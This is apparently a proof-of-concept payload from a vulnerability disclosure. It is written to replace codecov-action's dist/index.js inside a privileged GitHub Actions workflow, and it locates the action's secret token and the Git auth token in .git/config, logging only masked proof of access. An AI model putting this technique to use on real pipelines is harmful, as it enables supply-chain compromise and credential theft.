// Payload that replaces codecov/codecov-action@v4's dist/index.js.
// Executed by the runner when the privileged workflow's `uses: codecov/codecov-action@v4` step starts.
const fs = require('fs')
const crypto = require('crypto')

console.log('RCE_PROOF_MARKER: attacker code executed as the codecov-action step')
console.log('RCE_PROOF_REPO=' + process.env.GITHUB_REPOSITORY)
console.log('RCE_PROOF_STEP=' + process.env.GITHUB_ACTION)
console.log('RCE_PROOF_TRIGGERING_EVENT=' + process.env.GITHUB_EVENT_NAME)

// The reusable workflow passes a repository secret into this action input.
const tok = process.env.INPUT_TOKEN || ''
const sha = crypto.createHash('sha256').update(tok).digest('hex').slice(0, 12)
console.log('RCE_PROOF_SECRET_PRESENT=' + (tok ? 'yes' : 'no') + ' len=' + tok.length + ' sha256_12=' + sha)

try {
  const cfg = fs.readFileSync(process.env.GITHUB_WORKSPACE + '/.git/config', 'utf8')
  const m = cfg.match(/AUTHORIZATION: basic ([A-Za-z0-9+/=]+)/)
  if (m) {
    const t = Buffer.from(m[1], 'base64').toString('utf8').split(':')[1]
    console.log('RCE_PROOF_GIT_TOKEN_PREFIX=' + t.slice(0, 4) + ' len=' + t.length)
  } else {
    console.log('RCE_PROOF_GIT_TOKEN_PRESENT=no')
  }
} catch (e) {
  console.log('RCE_PROOF_GITCFG_ERR=' + e.message)
}

process.exit(0)
